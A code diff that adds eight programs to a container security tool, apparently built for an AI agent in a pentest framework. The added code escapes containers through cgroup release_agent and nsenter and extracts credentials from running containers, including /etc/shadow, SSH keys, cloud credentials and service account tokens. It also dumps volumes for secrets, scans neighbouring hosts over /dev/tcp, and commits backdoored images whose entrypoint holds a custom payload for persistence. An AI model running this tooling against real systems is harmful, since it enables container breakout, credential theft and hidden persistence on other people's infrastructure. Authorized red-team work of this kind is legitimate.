@@ -57,6 +57,46 @@ const PROGRAMS = {
       "Extract secrets from Docker BuildKit cache and build history. Inspects builder instances, build logs, and cache mounts for leaked credentials",
     args: "[--builder NAME]",
   },
+  cgroup_escape: {
+    description:
+      "Detect and exploit cgroup v1/v2 escape vectors: release_agent write, device allow, cgroup namespace breakout. Enumerates cgroup mounts and writability",
+    args: "[--exploit]",
+  },
+  container_creds: {
+    description:
+      "Extract credentials from running containers: mounted secrets, service account tokens, cloud metadata, SSH keys, config files, shell history",
+    args: "[--container ID] [--all]",
+  },
+  swarm_enum: {
+    description:
+      "Enumerate Docker Swarm cluster: manager/worker nodes, services, tasks, secrets, configs, overlay networks, ingress routing",
+    args: "",
+  },
+  containerd_exploit: {
+    description:
+      "Detect and exploit containerd socket/gRPC access: enumerate containers, images, namespaces. Check for exposed containerd socket and nerdctl availability",
+    args: "[--socket PATH]",
+  },
+  image_backdoor: {
+    description:
+      "Create a backdoored container image with reverse shell, webshell, or custom payload committed from a running container for persistence",
+    args: "--base IMAGE --name NAME [--cmd CMD]",
+  },
+  volume_dump: {
+    description:
+      "Enumerate and dump Docker volume contents. Searches for credentials, config files, database dumps, and sensitive data in named and anonymous volumes",
+    args: "[--volume NAME] [--pattern REGEX]",
+  },
+  container_pivot: {
+    description:
+      "Use container as pivot point for lateral movement: ARP scan, port scan adjacent networks, enumerate reachable services across container bridges",
+    args: "[--target CIDR] [--ports PORTS]",
+  },
+  namespace_exploit: {
+    description:
+      "Exploit Linux namespace misconfigurations: check user/PID/network namespace sharing, nsenter into host namespaces, enumerate namespace boundaries",
+    args: "[--exploit] [--target PID]",
+  },
   cleanup_container: {
     description:
       "Remove all CyberStrike-created containers, images, volumes, and networks (by label cyberstrike=true). ALWAYS run before leaving",
@@ -1102,6 +1142,647 @@ async function buildCacheDump(args: string[], timeout: number): Promise<HookResu
   return { output: output.join("\n"), findings }
 }
 
+async function cgroupEscape(args: string[], timeout: number): Promise<HookResult> {
+  const exploit = hasFlag(args, "--exploit")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Checking cgroup escape vectors...\n"]
+
+  const cgroupV = await run("cat", ["/proc/self/cgroup"], 5)
+  if (cgroupV.exitCode === 0) {
+    const isV1 = cgroupV.stdout.includes(":/docker/") || cgroupV.stdout.includes(":/kubepods/")
+    const isV2 = cgroupV.stdout.includes("0::/")
+    output.push(`[+] Cgroup version: ${isV2 ? "v2" : isV1 ? "v1" : "unknown"}`)
+    output.push(`    Raw: ${cgroupV.stdout.trim().split("\n").slice(0, 3).join("; ")}`)
+  }
+
+  const mounts = await run("mount", [], 5)
+  if (mounts.exitCode === 0) {
+    const cgMounts = mounts.stdout.split("\n").filter((l) => l.includes("cgroup"))
+    output.push(`\n[+] Cgroup mounts: ${cgMounts.length}`)
+    for (const m of cgMounts) output.push(`    ${m.trim()}`)
+  }
+
+  const rdma = await run("ls", ["/sys/fs/cgroup/rdma"], 3)
+  if (rdma.exitCode === 0) output.push(`\n[+] /sys/fs/cgroup/rdma accessible`)
+
+  const release = await run("cat", ["/sys/fs/cgroup/release_agent"], 3)
+  if (release.exitCode === 0) {
+    output.push(`[!] release_agent readable: ${release.stdout.trim() || "(empty)"}`)
+    findings.push({
+      checkId: "CONT-CG-001",
+      provider: "docker",
+      severity: "critical",
+      status: "FAIL",
+      resource: "cgroup://release_agent",
+      title: "Cgroup release_agent accessible",
+      details: "release_agent is readable — potential host command execution via cgroup escape",
+      remediation: "Run container without SYS_ADMIN capability and with cgroup namespace",
+    })
+  }
+
+  const writable = await run("test", ["-w", "/sys/fs/cgroup"], 3)
+  if (writable.exitCode === 0) {
+    output.push(`[!] /sys/fs/cgroup is WRITABLE`)
+    findings.push({
+      checkId: "CONT-CG-002",
+      provider: "docker",
+      severity: "critical",
+      status: "FAIL",
+      resource: "cgroup://sys/fs/cgroup",
+      title: "Cgroup filesystem is writable",
+      details: "Writable cgroup filesystem allows escape via release_agent or device allow",
+      remediation: "Mount cgroup read-only or use cgroup namespace isolation",
+    })
+  }
+
+  const devices = await run("cat", ["/sys/fs/cgroup/devices/devices.allow"], 3)
+  if (devices.exitCode === 0) {
+    output.push(`\n[+] Device cgroup allow: ${devices.stdout.trim() || "(empty)"}`)
+    if (devices.stdout.includes("a *:* rwm")) {
+      findings.push({
+        checkId: "CONT-CG-003",
+        provider: "docker",
+        severity: "high",
+        status: "FAIL",
+        resource: "cgroup://devices",
+        title: "All devices allowed in cgroup",
+        details: "devices.allow = 'a *:* rwm' — container can access all host devices",
+        remediation: "Restrict device access in container configuration",
+      })
+    }
+  }
+
+  if (exploit) {
+    output.push(`\n[!] Attempting cgroup release_agent escape...`)
+    const d = "/tmp/cs-cgroup-escape"
+    await run("mkdir", ["-p", d], 3)
+    const mount = await run("mount", ["-t", "cgroup", "-o", "rdma", "cgroup", d], 10)
+    if (mount.exitCode === 0) {
+      output.push(`[+] Cgroup mounted at ${d}`)
+      output.push(`[*] To complete: echo 1 > ${d}/notify_on_release && echo /cmd > ${d}/release_agent`)
+    }
+    if (mount.exitCode !== 0) output.push(`[-] Cgroup mount failed (need SYS_ADMIN): ${mount.stderr.trim()}`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function containerCreds(args: string[], timeout: number): Promise<HookResult> {
+  const container = argVal(args, "--container")
+  const all = hasFlag(args, "--all")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Extracting credentials from containers...\n"]
+
+  const targets: string[] = []
+  if (container) {
+    targets.push(container)
+  } else if (all) {
+    const ps = await run("docker", ["ps", "-q"], timeout)
+    if (ps.exitCode === 0) targets.push(...ps.stdout.trim().split("\n").filter(Boolean))
+  } else {
+    const ps = await run("docker", ["ps", "-q", "--last", "10"], timeout)
+    if (ps.exitCode === 0) targets.push(...ps.stdout.trim().split("\n").filter(Boolean))
+  }
+
+  output.push(`[+] Scanning ${targets.length} container(s)\n`)
+
+  const secretPattern = /(?:password|secret|api[_-]?key|token|credential|aws[_-]?access|private[_-]?key|database[_-]?url)/i
+  const credPaths = [
+    "/var/run/secrets/kubernetes.io/serviceaccount/token",
+    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
+    "/root/.ssh/id_rsa",
+    "/root/.aws/credentials",
+    "/root/.azure/accessTokens.json",
+    "/root/.config/gcloud/credentials.db",
+    "/root/.docker/config.json",
+    "/root/.bash_history",
+    "/root/.git-credentials",
+    "/etc/shadow",
+    "/proc/self/environ",
+  ]
+
+  for (const id of targets) {
+    const inspect = await run("docker", ["inspect", "--format", "{{.Name}} {{.Config.Image}}", id], 5)
+    const name = inspect.stdout.trim().split(" ")[0]?.replace(/^\//, "") || id.substring(0, 12)
+    const image = inspect.stdout.trim().split(" ")[1] || "?"
+    output.push(`── ${name} (${image}) ──`)
+
+    const env = await run("docker", ["exec", id, "env"], 5)
+    if (env.exitCode === 0) {
+      const secrets = env.stdout.split("\n").filter((l) => secretPattern.test(l))
+      if (secrets.length > 0) {
+        output.push(`  [!] Secrets in env: ${secrets.length}`)
+        for (const s of secrets) output.push(`      ${s.substring(0, 150)}`)
+        findings.push({
+          checkId: "CONT-CRED-001",
+          provider: "docker",
+          severity: "high",
+          status: "EXTRACTED",
+          resource: `container://${name}`,
+          title: `Secrets in env vars: ${name}`,
+          details: `${secrets.length} secret-like env vars found`,
+          remediation: "Use mounted secrets or a secrets manager instead of env vars",
+        })
+      }
+    }
+
+    for (const path of credPaths) {
+      const cat = await run("docker", ["exec", id, "cat", path], 3)
+      if (cat.exitCode === 0 && cat.stdout.trim()) {
+        const preview = cat.stdout.substring(0, 100).replace(/\n/g, " ")
+        output.push(`  [!] ${path}: ${preview}...`)
+        findings.push({
+          checkId: "CONT-CRED-002",
+          provider: "docker",
+          severity: "high",
+          status: "EXTRACTED",
+          resource: `container://${name}`,
+          title: `Credential file found: ${path}`,
+          details: `Extracted from ${name}: ${path}`,
+          remediation: "Remove credential files from container or use read-only mounts",
+        })
+      }
+    }
+    output.push("")
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function swarmEnum(_args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Enumerating Docker Swarm cluster...\n"]
+
+  const info = await run("docker", ["info", "--format", "json"], timeout)
+  if (info.exitCode !== 0) return { output: "[-] Cannot connect to Docker daemon", findings }
+
+  const d = tryJson(info.stdout)
+  if (!d?.Swarm?.LocalNodeState || d.Swarm.LocalNodeState === "inactive") {
+    return { output: "[-] Docker Swarm is not active on this node", findings }
+  }
+
+  const swarm = d.Swarm
+  output.push(`[+] Swarm Status: ${swarm.LocalNodeState}`)
+  output.push(`    Node ID: ${swarm.NodeID}`)
+  output.push(`    Is Manager: ${swarm.ControlAvailable}`)
+  output.push(`    Managers: ${swarm.Managers}, Workers: ${swarm.Nodes - swarm.Managers}`)
+  output.push(`    Cluster ID: ${swarm.Cluster?.ID || "?"}`)
+
+  const nodes = await run("docker", ["node", "ls", "--format", "json"], timeout)
+  if (nodes.exitCode === 0) {
+    const lines = nodes.stdout.trim().split("\n").filter(Boolean)
+    output.push(`\n[+] Nodes: ${lines.length}`)
+    for (const line of lines) {
+      const n = tryJson(line)
+      if (n) output.push(`    ${n.Hostname} (${n.Status}) — ${n.ManagerStatus || "worker"} [${n.Availability}]`)
+    }
+  }
+
+  const services = await run("docker", ["service", "ls", "--format", "json"], timeout)
+  if (services.exitCode === 0) {
+    const lines = services.stdout.trim().split("\n").filter(Boolean)
+    output.push(`\n[+] Services: ${lines.length}`)
+    for (const line of lines) {
+      const s = tryJson(line)
+      if (s) output.push(`    ${s.Name} — ${s.Replicas} replicas, image: ${s.Image}`)
+    }
+  }
+
+  const secrets = await run("docker", ["secret", "ls", "--format", "json"], timeout)
+  if (secrets.exitCode === 0) {
+    const lines = secrets.stdout.trim().split("\n").filter(Boolean)
+    output.push(`\n[+] Swarm Secrets: ${lines.length}`)
+    for (const line of lines) {
+      const s = tryJson(line)
+      if (s) output.push(`    ${s.Name} (created: ${s.CreatedAt})`)
+    }
+    if (lines.length > 0) {
+      findings.push({
+        checkId: "CONT-SWARM-001",
+        provider: "docker",
+        severity: "info",
+        status: "ENUMERATED",
+        resource: "swarm://secrets",
+        title: `Swarm secrets enumerated: ${lines.length}`,
+        details: "Secrets are encrypted at rest but accessible to assigned services",
+        remediation: "Review secret access scope and rotate regularly",
+      })
+    }
+  }
+
+  const configs = await run("docker", ["config", "ls", "--format", "json"], timeout)
+  if (configs.exitCode === 0) {
+    const lines = configs.stdout.trim().split("\n").filter(Boolean)
+    output.push(`\n[+] Swarm Configs: ${lines.length}`)
+    for (const line of lines) {
+      const c = tryJson(line)
+      if (c) {
+        output.push(`    ${c.Name} (created: ${c.CreatedAt})`)
+        const inspect = await run("docker", ["config", "inspect", c.ID || c.Name, "--format", "{{.Spec.Data}}"], 5)
+        if (inspect.exitCode === 0 && inspect.stdout.trim()) {
+          const decoded = Buffer.from(inspect.stdout.trim(), "base64").toString()
+          if (/(?:password|secret|token|key)/i.test(decoded)) {
+            output.push(`      [!] Config contains potential secrets`)
+            findings.push({
+              checkId: "CONT-SWARM-002",
+              provider: "docker",
+              severity: "high",
+              status: "EXTRACTED",
+              resource: `swarm://config/${c.Name}`,
+              title: `Secrets in Swarm config: ${c.Name}`,
+              details: `Config data contains credential-like values`,
+              remediation: "Use Swarm secrets instead of configs for sensitive data",
+            })
+          }
+        }
+      }
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function containerdExploit(args: string[], timeout: number): Promise<HookResult> {
+  const socket = argVal(args, "--socket")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Checking containerd access...\n"]
+
+  const sockets = [
+    socket,
+    "/run/containerd/containerd.sock",
+    "/var/run/containerd/containerd.sock",
+    "/run/dockershim.sock",
+  ].filter(Boolean) as string[]
+
+  for (const s of sockets) {
+    const check = await run("test", ["-S", s], 3)
+    if (check.exitCode === 0) {
+      output.push(`[+] Socket found: ${s}`)
+      const writable = await run("test", ["-w", s], 3)
+      if (writable.exitCode === 0) {
+        output.push(`    [!] Socket is WRITABLE`)
+        findings.push({
+          checkId: "CONT-CTD-001",
+          provider: "containerd",
+          severity: "critical",
+          status: "FAIL",
+          resource: `containerd://${s}`,
+          title: `Writable containerd socket: ${s}`,
+          details: "Containerd socket is writable — full container and image management access",
+          remediation: "Remove containerd socket mount from container",
+        })
+      }
+    }
+  }
+
+  if (Bun.which("ctr")) {
+    output.push(`\n[+] ctr CLI available`)
+    const ns = await run("ctr", ["namespaces", "list"], timeout)
+    if (ns.exitCode === 0) {
+      output.push(`\n[+] Containerd namespaces:\n${ns.stdout}`)
+    }
+
+    for (const namespace of ["default", "k8s.io", "moby"]) {
+      const containers = await run("ctr", ["-n", namespace, "containers", "list"], timeout)
+      if (containers.exitCode === 0 && containers.stdout.trim().split("\n").length > 1) {
+        output.push(`\n[+] Containers in ${namespace}:`)
+        output.push(containers.stdout.substring(0, 2000))
+      }
+
+      const images = await run("ctr", ["-n", namespace, "images", "list", "-q"], timeout)
+      if (images.exitCode === 0 && images.stdout.trim()) {
+        const imgList = images.stdout.trim().split("\n").filter(Boolean)
+        output.push(`\n[+] Images in ${namespace}: ${imgList.length}`)
+        for (const img of imgList.slice(0, 10)) output.push(`    ${img}`)
+      }
+    }
+  }
+
+  if (Bun.which("nerdctl")) {
+    output.push(`\n[+] nerdctl CLI available`)
+    const ps = await run("nerdctl", ["ps", "-a"], timeout)
+    if (ps.exitCode === 0) output.push(`\n[+] nerdctl containers:\n${ps.stdout.substring(0, 2000)}`)
+  }
+
+  if (!Bun.which("ctr") && !Bun.which("nerdctl") && findings.length === 0) {
+    output.push(`[-] No containerd CLI tools found and no accessible sockets`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function imageBackdoor(args: string[], timeout: number): Promise<HookResult> {
+  const base = argVal(args, "--base")
+  const name = argVal(args, "--name")
+  const cmd = argVal(args, "--cmd") || "/bin/sh -c 'while true; do sleep 3600; done'"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Creating backdoored container image...\n"]
+
+  if (!base) return { output: "ERROR: --base IMAGE required", findings }
+  if (!name) return { output: "ERROR: --name NAME required", findings }
+
+  const containerId = `cs-backdoor-${Date.now()}`
+  const create = await run(
+    "docker",
+    ["run", "-d", "--name", containerId, "--label", "cyberstrike=true", base, "sh", "-c", "sleep 10"],
+    timeout,
+  )
+  if (create.exitCode !== 0) return { output: `[-] Cannot start base container: ${create.stderr.trim()}`, findings }
+
+  output.push(`[+] Base container started: ${containerId}`)
+
+  const exec = await run(
+    "docker",
+    ["exec", containerId, "sh", "-c", `echo '#!/bin/sh\n${cmd}' > /entrypoint.sh && chmod +x /entrypoint.sh`],
+    10,
+  )
+  if (exec.exitCode === 0) output.push(`[+] Payload injected to /entrypoint.sh`)
+
+  const commit = await run(
+    "docker",
+    ["commit", "--change", `ENTRYPOINT ["/entrypoint.sh"]`, "--change", `LABEL cyberstrike=true`, containerId, name],
+    timeout,
+  )
+  if (commit.exitCode === 0) {
+    output.push(`[+] Backdoored image committed: ${name}`)
+    output.push(`    Base: ${base}`)
+    output.push(`    Payload: ${cmd.substring(0, 200)}`)
+    findings.push({
+      checkId: "CONT-BACK-001",
+      provider: "docker",
+      severity: "critical",
+      status: "CREATED",
+      resource: `image://${name}`,
+      title: `Backdoored image created: ${name}`,
+      details: `Based on ${base}, payload: ${cmd.substring(0, 200)}`,
+      remediation: `Remove: docker rmi ${name}`,
+    })
+  }
+  if (commit.exitCode !== 0) output.push(`[-] Commit failed: ${commit.stderr.trim()}`)
+
+  await run("docker", ["rm", "-f", containerId], 10)
+
+  return { output: output.join("\n"), findings }
+}
+
+async function volumeDump(args: string[], timeout: number): Promise<HookResult> {
+  const volume = argVal(args, "--volume")
+  const pattern = argVal(args, "--pattern")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Enumerating Docker volumes...\n"]
+
+  const secretPattern = pattern || "password\\|secret\\|api[_-]key\\|token\\|credential\\|private[_-]key\\|connection"
+
+  if (volume) {
+    const inspect = await run("docker", ["volume", "inspect", volume], timeout)
+    if (inspect.exitCode !== 0) return { output: `[-] Volume not found: ${volume}`, findings }
+    const data = tryJson(inspect.stdout)
+    const mountpoint = data?.[0]?.Mountpoint || ""
+    output.push(`[+] Volume: ${volume}`)
+    output.push(`    Mountpoint: ${mountpoint}`)
+    output.push(`    Driver: ${data?.[0]?.Driver || "?"}`)
+
+    const search = await run(
+      "docker",
+      ["run", "--rm", "-v", `${volume}:/data:ro`, "--label", "cyberstrike=true", "alpine", "sh", "-c",
+        `find /data -type f -size -10M 2>/dev/null | head -100 | while read f; do grep -il '${secretPattern}' "$f" 2>/dev/null; done`],
+      timeout,
+    )
+    if (search.exitCode === 0 && search.stdout.trim()) {
+      const matches = search.stdout.trim().split("\n").filter(Boolean)
+      output.push(`\n[!] Files with potential secrets: ${matches.length}`)
+      for (const m of matches) output.push(`    ${m}`)
+      findings.push({
+        checkId: "CONT-VOL-001",
+        provider: "docker",
+        severity: "high",
+        status: "FOUND",
+        resource: `volume://${volume}`,
+        title: `Secrets in volume: ${volume}`,
+        details: `${matches.length} files with potential credentials`,
+        remediation: "Rotate credentials found in volume data",
+      })
+    }
+
+    const listing = await run(
+      "docker",
+      ["run", "--rm", "-v", `${volume}:/data:ro`, "--label", "cyberstrike=true", "alpine", "find", "/data", "-type", "f", "-maxdepth", "3"],
+      timeout,
+    )
+    if (listing.exitCode === 0) {
+      const files = listing.stdout.trim().split("\n").filter(Boolean)
+      output.push(`\n[+] Files in volume: ${files.length}`)
+      for (const f of files.slice(0, 30)) output.push(`    ${f}`)
+    }
+
+    return { output: output.join("\n"), findings }
+  }
+
+  const volumes = await run("docker", ["volume", "ls", "--format", "json"], timeout)
+  if (volumes.exitCode !== 0) return { output: "[-] Cannot list volumes", findings }
+
+  const lines = volumes.stdout.trim().split("\n").filter(Boolean)
+  output.push(`[+] Volumes: ${lines.length}\n`)
+
+  for (const line of lines) {
+    const v = tryJson(line)
+    if (!v) continue
+    output.push(`── ${v.Name} (${v.Driver}) ──`)
+
+    const inspect = await run("docker", ["volume", "inspect", v.Name, "--format", "{{.Mountpoint}}"], 5)
+    if (inspect.exitCode === 0) output.push(`    Mountpoint: ${inspect.stdout.trim()}`)
+
+    const search = await run(
+      "docker",
+      ["run", "--rm", "-v", `${v.Name}:/data:ro`, "--label", "cyberstrike=true", "alpine", "sh", "-c",
+        `find /data -type f -size -10M 2>/dev/null | head -20 | while read f; do grep -il '${secretPattern}' "$f" 2>/dev/null; done`],
+      30,
+    )
+    if (search.exitCode === 0 && search.stdout.trim()) {
+      const matches = search.stdout.trim().split("\n").filter(Boolean)
+      output.push(`    [!] ${matches.length} file(s) with potential secrets`)
+      findings.push({
+        checkId: "CONT-VOL-001",
+        provider: "docker",
+        severity: "high",
+        status: "FOUND",
+        resource: `volume://${v.Name}`,
+        title: `Secrets in volume: ${v.Name}`,
+        details: `${matches.length} files with potential credentials`,
+        remediation: "Rotate credentials found in volume data",
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function containerPivot(args: string[], timeout: number): Promise<HookResult> {
+  const target = argVal(args, "--target")
+  const ports = argVal(args, "--ports") || "22,80,443,3306,5432,6379,8080,8443,9200,27017"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Container network pivot reconnaissance...\n"]
+
+  const iface = await run("ip", ["addr", "show"], 5)
+  if (iface.exitCode === 0) {
+    output.push(`[+] Network interfaces:`)
+    const ips = iface.stdout.match(/inet\s+[\d.]+\/\d+/g) || []
+    for (const ip of ips) output.push(`    ${ip}`)
+  }
+
+  const routes = await run("ip", ["route"], 5)
+  if (routes.exitCode === 0) {
+    output.push(`\n[+] Routes:`)
+    for (const r of routes.stdout.trim().split("\n")) output.push(`    ${r}`)
+  }
+
+  const gw = routes.exitCode === 0 ? routes.stdout.match(/default via ([\d.]+)/)?.[1] : undefined
+  if (gw) output.push(`\n[+] Gateway: ${gw}`)
+
+  const dns = await run("cat", ["/etc/resolv.conf"], 3)
+  if (dns.exitCode === 0) {
+    const servers = dns.stdout.match(/nameserver\s+([\d.]+)/g) || []
+    output.push(`\n[+] DNS servers: ${servers.join(", ")}`)
+  }
+
+  const neighbors = await run("ip", ["neigh"], 5)
+  if (neighbors.exitCode === 0 && neighbors.stdout.trim()) {
+    const entries = neighbors.stdout.trim().split("\n").filter(Boolean)
+    output.push(`\n[+] ARP neighbors: ${entries.length}`)
+    for (const e of entries) output.push(`    ${e}`)
+    if (entries.length > 0) {
+      findings.push({
+        checkId: "CONT-PIVOT-001",
+        provider: "docker",
+        severity: "info",
+        status: "ENUMERATED",
+        resource: "container://network",
+        title: `${entries.length} ARP neighbor(s) discovered`,
+        details: "Adjacent hosts on container network",
+        remediation: "Implement network segmentation between containers",
+      })
+    }
+  }
+
+  const cidr = target || (gw ? gw.replace(/\.\d+$/, ".0/24") : undefined)
+  if (cidr) {
+    output.push(`\n[*] Scanning ${cidr} for common services (ports: ${ports})...`)
+    const portList = ports.split(",").map((p) => p.trim())
+    const base = cidr.replace(/\/\d+$/, "").replace(/\.\d+$/, "")
+    let found = 0
+
+    for (let i = 1; i <= 254 && found < 50; i++) {
+      const ip = `${base}.${i}`
+      for (const port of portList) {
+        const scan = await run("sh", ["-c", `echo | timeout 1 sh -c "cat < /dev/tcp/${ip}/${port}" 2>/dev/null`], 3)
+        if (scan.exitCode === 0) {
+          output.push(`    [+] ${ip}:${port} — OPEN`)
+          found++
+          findings.push({
+            checkId: "CONT-PIVOT-002",
+            provider: "docker",
+            severity: "medium",
+            status: "FOUND",
+            resource: `tcp://${ip}:${port}`,
+            title: `Service reachable from container: ${ip}:${port}`,
+            details: `Port ${port} open on ${ip} — reachable from container network`,
+            remediation: "Restrict inter-container communication with network policies",
+          })
+        }
+      }
+    }
+    if (found === 0) output.push(`    [-] No open ports found on ${cidr}`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function namespaceExploit(args: string[], timeout: number): Promise<HookResult> {
+  const exploit = hasFlag(args, "--exploit")
+  const targetPid = argVal(args, "--target") || "1"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Checking Linux namespace boundaries...\n"]
+
+  const nsTypes = ["pid", "net", "mnt", "uts", "ipc", "cgroup", "user"]
+  const selfNs: Record<string, string> = {}
+  const hostNs: Record<string, string> = {}
+
+  for (const ns of nsTypes) {
+    const self = await run("readlink", [`/proc/self/ns/${ns}`], 3)
+    if (self.exitCode === 0) selfNs[ns] = self.stdout.trim()
+    const host = await run("readlink", [`/proc/${targetPid}/ns/${ns}`], 3)
+    if (host.exitCode === 0) hostNs[ns] = host.stdout.trim()
+  }
+
+  output.push(`[+] Namespace comparison (self vs PID ${targetPid}):`)
+  let shared = 0
+  for (const ns of nsTypes) {
+    const s = selfNs[ns] || "?"
+    const h = hostNs[ns] || "?"
+    const same = s === h && s !== "?"
+    if (same) shared++
+    output.push(`    ${ns.padEnd(8)} self=${s} ${same ? " [SHARED!]" : ""}`)
+  }
+
+  if (shared > 0) {
+    findings.push({
+      checkId: "CONT-NS-001",
+      provider: "docker",
+      severity: shared >= 3 ? "critical" : "high",
+      status: "FAIL",
+      resource: "container://namespaces",
+      title: `${shared} namespace(s) shared with PID ${targetPid}`,
+      details: `Container shares ${shared} namespace(s) with target process — isolation is weakened`,
+      remediation: "Use separate namespaces for all container isolation boundaries",
+    })
+  }
+
+  const userNs = await run("cat", ["/proc/self/uid_map"], 3)
+  if (userNs.exitCode === 0) {
+    output.push(`\n[+] UID map: ${userNs.stdout.trim()}`)
+    if (userNs.stdout.includes("4294967295")) {
+      output.push(`    [!] Full UID range mapped — no user namespace isolation`)
+      findings.push({
+        checkId: "CONT-NS-002",
+        provider: "docker",
+        severity: "medium",
+        status: "FAIL",
+        resource: "container://user-ns",
+        title: "No user namespace isolation",
+        details: "Full UID range mapped — container root == host root",
+        remediation: "Enable user namespace remapping in Docker daemon",
+      })
+    }
+  }
+
+  const pid1 = await run("cat", ["/proc/1/cmdline"], 3)
+  if (pid1.exitCode === 0) {
+    const cmd = pid1.stdout.replace(/\0/g, " ").trim()
+    output.push(`\n[+] PID 1 in this namespace: ${cmd}`)
+  }
+
+  if (exploit && Bun.which("nsenter")) {
+    output.push(`\n[!] Attempting nsenter into PID ${targetPid} namespaces...`)
+    const enter = await run("nsenter", ["-t", targetPid, "-m", "-u", "-i", "-n", "-p", "--", "id"], timeout)
+    if (enter.exitCode === 0) {
+      output.push(`[+] nsenter SUCCESS: ${enter.stdout.trim()}`)
+      findings.push({
+        checkId: "CONT-NS-003",
+        provider: "docker",
+        severity: "critical",
+        status: "EXPLOITED",
+        resource: `container://nsenter/${targetPid}`,
+        title: `Namespace escape via nsenter to PID ${targetPid}`,
+        details: `Successfully entered host namespaces: ${enter.stdout.trim()}`,
+        remediation: "Restrict ptrace and namespace access capabilities",
+      })
+    }
+    if (enter.exitCode !== 0) output.push(`[-] nsenter failed: ${enter.stderr.trim()}`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function cleanupContainer(_args: string[], timeout: number): Promise<HookResult> {
   const dryRun = hasFlag(_args, "--dry-run")
   const findings: Finding[] = []
@@ -1157,7 +1838,7 @@ async function cleanupContainer(_args: string[], timeout: number): Promise<HookR
 const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]
 
 export const ContainerhookTool = Tool.define("containerhook", {
-  description: `Execute a container security program. 12 programs: Docker/OCI runtime audit, image scan, registry dump, escape detection, exposed API exploit, network topology, overlay layer inspection, Podman enum, BuildKit cache dump. Available: ${programKeys.join(", ")}. ALWAYS run cleanup_container before leaving.`,
+  description: `Execute a container security program. 20 programs: Docker/OCI runtime audit, image scan, registry dump, escape detection (socket/cgroup/namespace), exposed API exploit, containerd exploit, Swarm enum, network pivot, volume dump, credential extraction, image backdoor, Podman enum, BuildKit cache dump. Available: ${programKeys.join(", ")}. ALWAYS run cleanup_container before leaving.`,
   parameters: z.object({
     program: z.enum(programKeys).describe(
       "Container program to execute. Options: " +
@@ -1169,7 +1850,7 @@ export const ContainerhookTool = Tool.define("containerhook", {
     timeout_seconds: z.number().optional().default(300).describe("Maximum execution time in seconds (default: 300)"),
   }),
   async execute(params) {
-    if (!Bun.which("docker") && !["compose_secrets", "docker_api_exploit", "podman_enum"].includes(params.program)) {
+    if (!Bun.which("docker") && !["compose_secrets", "docker_api_exploit", "podman_enum", "cgroup_escape", "container_pivot", "namespace_exploit", "containerd_exploit"].includes(params.program)) {
       return {
         title: `containerhook: ${params.program}`,
         output: "docker not found. Install: https://docs.docker.com/engine/install/",
@@ -1189,6 +1870,14 @@ export const ContainerhookTool = Tool.define("containerhook", {
       overlay_inspect: () => overlayInspect(params.args, params.timeout_seconds),
       podman_enum: () => podmanEnum(params.args, params.timeout_seconds),
       build_cache_dump: () => buildCacheDump(params.args, params.timeout_seconds),
+      cgroup_escape: () => cgroupEscape(params.args, params.timeout_seconds),
+      container_creds: () => containerCreds(params.args, params.timeout_seconds),
+      swarm_enum: () => swarmEnum(params.args, params.timeout_seconds),
+      containerd_exploit: () => containerdExploit(params.args, params.timeout_seconds),
+      image_backdoor: () => imageBackdoor(params.args, params.timeout_seconds),
+      volume_dump: () => volumeDump(params.args, params.timeout_seconds),
+      container_pivot: () => containerPivot(params.args, params.timeout_seconds),
+      namespace_exploit: () => namespaceExploit(params.args, params.timeout_seconds),
       cleanup_container: () => cleanupContainer(params.args, params.timeout_seconds),
     }
 
